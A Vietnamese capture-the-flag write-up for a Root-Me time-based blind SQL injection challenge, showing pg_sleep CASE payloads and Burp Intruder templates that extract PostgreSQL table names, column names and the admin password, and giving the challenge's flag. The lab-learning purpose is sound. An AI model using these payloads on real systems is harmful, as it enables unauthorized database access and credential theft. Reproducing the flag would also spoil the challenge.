# WRITE UP

**Challenge: [SQL Injection – Time-based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)**

Về SQLi Time-based, đây là một loại SQLi Blind khi ta sử dụng thời gian res của req để dự đoán thông tin và BurpSuite sẽ hỗ trợ rất tốt về mảng này. Khi ta sử dụng một câu Query đúng, thời gian phản hồi sẽ chậm và ngược lại.

Trong website, ta có một tab là Memberlist, có query như sau:

*http://challenge01.root-me.org/web-serveur/ch40/?action=memberlist&member=**\[x\]***

<img src="./media/image1.png" style="width:6.72382in;height:2.31814in" alt="Graphical user interface, application, website Description automatically generated" />

Ở đây, ta có thể lợi dụng để thực hiện tiêm payload vào đằng sau nó và thực hiện blind. Thử blind với payload bằng nhiều version() database khác nhau:

<img src="./media/image2.png" style="width:6.71617in;height:2.76611in" alt="Graphical user interface, text Description automatically generated" />

Payload: *3;select+case+when+(0=0)+then+pg\_sleep(10)+else+pg\_sleep(-1)+end--*

Payload này sẽ khiến dtb res chậm hơn với pg\_sleep() khi query đúng.

-   Server thuộc dạng Postgresql: [pg\_sleep() - pgPedia - a PostgreSQL Encyclopedia](https://pgpedia.info/p/pg_sleep.html)

Từ đó, ta sẽ sử dụng Burp Intruder để thực hiện bruteforce table\_name, column\_name như các bài SQLi đã làm.

1.  **Tìm table\_name**

Trước tiên, ta cần tìm kiếm độ dài của table:

Payload: ***3;select+case+when+((select+length(table\_name)+from+information\_schema.tables+limit+1)=\[length\])+then+pg\_sleep(10)+else+pg\_sleep(-1)+end—***

Đưa vào Intruder và bruteforce:

<img src="./media/image3.png" style="width:6.5in;height:2.82222in" alt="Graphical user interface, application Description automatically generated" />

Ở bảng kết quả, ta filter lại cột “Response Complete”. Res nào có độ lớn cao nhất thì chắc hẳn đó là payload đúng.

-   length(table\_name) == 5

Đã có table\_name, ta tiến hành bruteforce table\_name. Bỏ vào intruder:

*member=3;select+case+when+(substr((select+table\_name+from+information\_schema.tables+limit+1),**§1§**,1)=chr(**§§**))+then+pg\_sleep(10)+else+pg\_sleep(-1)+end--*

<img src="./media/image4.png" style="width:6.49862in;height:2.09615in" alt="Graphical user interface, application Description automatically generated" />

Ghép lại ta được **table\_name=users**

1.  **Tìm column\_name**

Tương tự như table\_name, ta tìm length(column\_name) của cột đầu tiên:

<img src="./media/image5.png" style="width:6.49972in;height:2.16667in" alt="Graphical user interface, application Description automatically generated" />

Kết quả trả về payload length(column\_name) = 2. Ta có thể dự đoán nó có thể là ‘id’. Kiểm chứng bằng Repeater:

-   Ký tự ‘i’:

<img src="./media/image6.png" style="width:6.20131in;height:2.5481in" alt="Graphical user interface, text Description automatically generated" />

-   Ký tự ‘d’:

<img src="./media/image7.png" style="width:6.5in;height:2.66111in" alt="Graphical user interface, text, email Description automatically generated" />

-   Cả 2 response đều tốn 2,285 miliseconds (tương tự thời gian fuzz, khác với response thông thường ~ 200 – 300 milisecond) column\[0\] == id

Để tìm được column tiếp theo, ta sử dụng offset để filter lại và thực hiện tương tự, bruteforce thôi:

<img src="./media/image8.png" style="width:6.5in;height:2.68889in" alt="Graphical user interface, application Description automatically generated" />

-   length(column\[2\]) == 8

<img src="./media/image9.png" style="width:6.5in;height:2.96042in" alt="Table Description automatically generated" />

-   column\_name\[1\] = username

Column\[2\], có length == 9:

<img src="./media/image10.png" style="width:6.5in;height:2.68264in" alt="Graphical user interface, text Description automatically generated" />

Bruteforce được kết quả column\_name\[2\] == firstname:

<img src="./media/image11.png" style="width:6.5in;height:3.33125in" alt="Graphical user interface, text, application Description automatically generated" />

Tương tự, column\[3\] có length == 8, và dễ dàng đoán được:

-   column\_name\[3\] == lastname:

<img src="./media/image12.png" style="width:6.5in;height:2.32431in" alt="Graphical user interface, text Description automatically generated" />

<img src="./media/image13.png" style="width:6.5in;height:2.09514in" alt="Graphical user interface, text Description automatically generated" />

Column\[4\] có length == 5. Suy đoán và thử được kết quả:

-   column\_name\[4\] == email

<img src="./media/image14.png" style="width:6.5in;height:2.66319in" alt="Graphical user interface, text, email Description automatically generated" />

<img src="./media/image15.png" style="width:6.5in;height:2.38194in" alt="Graphical user interface, text Description automatically generated" />

column\[5\] có độ dài ký tự là length == 8:

<img src="./media/image16.png" style="width:6.5in;height:2.41528in" alt="Graphical user interface, text Description automatically generated" />

Vì length ==8, ta thử kiểm chứng keyword = ‘password’ thì thấy trùng khớp:

<img src="./media/image17.png" style="width:6.5in;height:2.38472in" alt="Graphical user interface, text, application Description automatically generated" />

Như vậy, ta đã tìm được đúng cột password, giờ thì tìm password của admin. Admin có id=1, ta chỉ cần tìm kiếm với offset = 0 là sẽ ra.

<img src="./media/image18.png" style="width:6.5in;height:3.13958in" alt="Graphical user interface, application Description automatically generated" />

-   **length(password) == 13**

Sau hơn 1 ngày bruteforce với payload, ta được kết quả:

*member=3;select+case+when+(substr((select+password+from+users+limit+1+offset+0),**§§**,1)=chr(**§§**))+then+pg\_sleep(10)+else+pg\_sleep(-1)+end--*

<img src="./media/image19.png" style="width:6.5in;height:3.0625in" alt="Graphical user interface, application, table, Excel Description automatically generated" />

Ta có được chuỗi ascii password: **84 33 109 51 66 64 115 51 68 83 81 76 33**

Convert to text: **T!m3B@s3DSQL!**

<img src="./media/image20.png" style="width:6.5in;height:3.51597in" alt="A screenshot of a computer Description automatically generated" />

**Flag:** T!m3B@s3DSQL!

\- Flag:
